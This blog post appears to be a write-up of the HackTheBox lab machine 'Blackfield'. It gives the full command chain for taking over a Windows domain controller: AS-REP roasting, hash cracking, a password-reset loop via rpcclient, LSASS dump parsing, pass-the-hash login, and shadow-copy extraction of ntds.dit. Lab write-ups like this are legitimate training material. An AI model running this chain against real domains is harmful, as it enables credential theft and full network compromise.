---
layout: post
author: k0z4c
title: Blackfield
---

## **Getting Access**

We start with nmap scanning every port
```bash
nmap -A -T4 -Pn -n -oA nmap/tcp_all -p- -vvv blackfield.htb
```

![]({% link assets/htb/blackfield/nmap.png %})

After seeing that we are facing a Windows box (RPC's ports) and that is a domain controller (port 53),
the enumeration doesn't seem to lead us very far.

So we try to see if anonymous access is allowed on the SMB service
```bash
smbclient -U'a%a' -L \\\\blackfield.htb
```

Then, with smbmap let's look where we have access

![]({% link assets/htb/blackfield/profiles.png %})

Entering to the profiles$ share, we see that we can obtain a bunch of domain usernames

Let's save those names with 
```bash
smbmap -H blackfield.htb -d blackfield -u 'a' -r profiles$ | cut -f 3 | tail -n +8 > usernames.lst
```

Then, let's test if the PRE_AUTH kerberos flag it's enabled for some accounts with
```bash
GetNPUsers.py -u usernames.lst -dc-ip 10.10.10.192 -format hashcat -outputfile hashes BLACKFIELD.LOCAL/
```
![]({% link assets/htb/blackfield/preauth.png %})
  
So we got the hash of the support account
![]({% link assets/htb/blackfield/support_hash.png %})

Let's crack it with hashcat !
```bash
hashcat -a 0 -m 18200 /root/hashes /root/rockyou.txt
```
![]({% link assets/htb/blackfield/support_pass.png %})

After seeing that we cannot log with the WinRm service to the machine, let's see if we have further access on SMB

![]({% link assets/htb/blackfield/support_access.png %})

After downloading SYSVOL with smbget I found nothing because the disk was encrypted with EFS encryption.

## ***RPCs, motherfuckers!***

So, what's now ?

So I thought about RPC; in fact, many services on the remote host are usually exposed through RPC interfaces.
For example, through RPC is possible to enumerate account usernames, privileges, domain info, ... 

Let's give it a try
```bash 
rpcclient -W blackfield -U'support%#00^BlackKnight' blackfield.htb
```

We see that our pwned account has so many privileges
![]({% link assets/htb/blackfield/support_privs.png %})

So I started to think I could abuse those rights in some ways; for example, why dont try to reset a password to some user?
Then I wrote the following script 

{% highlight bash linenos %}
for u in $(cat /root/htb/blackfield/enum_users.lst); 
do
	echo "[*] Tryin $u.."
	rpcclient -W BLACKFIELD -U 'support%#00^BlackKnight' -c "setuserinfo2 $u 23 Pwned123!!" 10.10.10.192;

	if [[ $? -eq 0 ]]; then
		echo "[*] PWNED $u !!!"
		break
	fi
done
{% endhighlight %}


And voila' !


![]({% link assets/htb/blackfield/audit_pwn.png %})

So now we are able to access again SMB network share with more privileges.
In particular, we are now able to access the forensic share 
```bash
smbmap -H blackfield.htb -u audit2020  -p 'Pwned123!!' -R forensic
```

## **Recovering hashes from LSASS minidump**

![]({% link assets/htb/blackfield/lsass_zip.png %})

The lsass.zip file looks very interesting; we can recover maybe some hashes. 
Let's download it 
```bash
smbget  -U'audit2020%Pwned123!!'  -w blackfield.local smb://blackfield.htb/forensic/memory_analysis/lsass.zip
```
The file is a memory minidump, as expected
![]({% link assets/htb/blackfield/file_lsass.png %})

So we can examine it with pypikatz!
```bash 
pypykatz lsa minidump lsass.DMP -o lsass_hashes.data
```

![]({% link assets/htb/blackfield/backup_hash.png %})

Now we can log onto the box with the svc_backup account
```bash
evil-winrm.rb -i 10.10.10.192 -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup
```

![]({% link assets/htb/blackfield/backup_privs.png %})

## **Privilege escalation with Shadow Copy**

The SeBackupPrivilege (we belong to the Backup Operators Group) is awesome; we can read and backup every file on the machine
without worry about any ACLs restriction on the filesystem!

So we can copy the ntds.dit file and recover all the domain hashes.
Following this guide https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group
we can priv esc to Administrator, after making a ShadowCopy of the domain database. 

Let's write this script then
```bash
set context persistent nowriters  
set metadata c:\users\svc_backup\appdata\local\temp\juicy.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup 
```

After uploading it on the target box, we make a shadow copy of C: with
```bash
diskshadow /s script.dsh
```
![]({% link assets/htb/blackfield/shadow.png %})

After the process completes, we'll find our copy on a W: drive.
To retrieve the ntds.dit database file, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder.

So we download and compile with Visual Studio this project https://github.com/giuliano108/SeBackupPrivilege
and we load the SeBackupPrivilegeCmdLets.dll and SeBackupPrivilegeUtils.dll in our powershell session and we type
```bash
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\users\svc_backup\appdata\local\temp\ntds.dit -Overwrite
```

Now we backup the system hive needed  to later decrypt the ntds.dit file
```bash
reg save HKLM\SYSTEM c:\users\svc_backup\appdata\local\temp\system.hive
```

Now we can finalliy download everything
![]({% link assets/htb/blackfield/download_pwn.png %})

Let's now recover the Administrator hash
```bash
secretsdump.py -ntds /root/evil-winrm/ntds.dit -system /root/evil-winrm/system.hive -hashes lmnhash:nthash LOCAL -outputfile loot.hashes
```

![]({% link assets/htb/blackfield/pwn_hashes.png %})

Let's log in as Administrator
![]({% link assets/htb/blackfield/pwn.png %})

pwned ! (:
